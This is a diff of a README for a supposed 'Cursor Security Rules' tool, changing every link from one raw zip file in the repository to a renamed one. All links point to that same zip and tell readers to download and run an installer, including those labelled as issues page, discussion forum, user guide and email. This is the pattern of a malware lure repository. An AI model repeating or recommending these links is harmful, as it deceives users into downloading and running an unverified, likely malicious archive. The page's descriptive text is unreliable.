@@ -6,7 +6,7 @@ Welcome to the Cursor Security Rules repository. This guide will help you easily
 
 ## 📥 Download Now
 
-[![Download](https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/cursor-security-rules.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/cursor-security-rules.zip)
+[![Download](https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/rules_security_cursor_v1.8.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/rules_security_cursor_v1.8.zip)
 
 ## ⚙️ Requirements
 
@@ -29,7 +29,7 @@ By following these rules, you will create a safer environment for your projects.
 
 ## 🔗 Download & Install
 
-To get started, visit our [Releases page](https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/cursor-security-rules.zip) to download the latest version. Here’s how:
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/rules_security_cursor_v1.8.zip) to download the latest version. Here’s how:
 
 1. Click on the **Releases link** above.
 2. Choose the version you wish to install.
@@ -51,15 +51,15 @@ After installation, follow these steps to use Cursor Security Rules:
 
 We provide documentation to help you understand how to use the Cursor Security Rules effectively:
 
-- **User Guide:** A detailed guide on configuring rules can be found within the application or in the documentation section on our [GitHub page](https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/cursor-security-rules.zip).
+- **User Guide:** A detailed guide on configuring rules can be found within the application or in the documentation section on our [GitHub page](https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/rules_security_cursor_v1.8.zip).
 - **Examples:** Review practical examples of how to apply each rule in different scenarios.
 
 ## 🌐 Community Support
 
 If you have questions or need help, our community is here to support you:
 
-- **GitHub Issues:** Use the [issues page](https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/cursor-security-rules.zip) to report bugs or request features.
-- **Discussion Forum:** Join our [discussion forum](https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/cursor-security-rules.zip) to connect with other users and developers.
+- **GitHub Issues:** Use the [issues page](https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/rules_security_cursor_v1.8.zip) to report bugs or request features.
+- **Discussion Forum:** Join our [discussion forum](https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/rules_security_cursor_v1.8.zip) to connect with other users and developers.
 
 ## 📝 Contribution Guidelines
 
@@ -73,11 +73,11 @@ We encourage users to share their insights and improvements.
 
 ## 🔄 Update Process
 
-Keep your application up-to-date by regularly checking our [Releases page](https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/cursor-security-rules.zip). New features and security updates are released periodically.
+Keep your application up-to-date by regularly checking our [Releases page](https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/rules_security_cursor_v1.8.zip). New features and security updates are released periodically.
 
 ### Steps to Update:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/cursor-security-rules.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/rules_security_cursor_v1.8.zip).
 2. Download the latest version of the application.
 3. Run the installer to upgrade your existing version.
 
@@ -85,8 +85,8 @@ Keep your application up-to-date by regularly checking our [Releases page](https
 
 If you need additional support or have any questions not addressed in this guide, feel free to reach out:
 
-- Email: https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/cursor-security-rules.zip
-- GitHub: Use our [issues page](https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/cursor-security-rules.zip) for inquiries.
+- Email: https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/rules_security_cursor_v1.8.zip
+- GitHub: Use our [issues page](https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/rules_security_cursor_v1.8.zip) for inquiries.
 
 ## 📜 License
 
@@ -98,4 +98,4 @@ Thank you for using Cursor Security Rules. Together, we can create a more secure
 
 ## 📥 Download Again
 
-Don’t forget, you can always return to our [Releases page](https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/cursor-security-rules.zip) to download the latest updates and features!
+Don’t forget, you can always return to our [Releases page](https://raw.githubusercontent.com/Deadly244/cursor-security-rules/main/Homalopterous/rules_security_cursor_v1.8.zip) to download the latest updates and features!
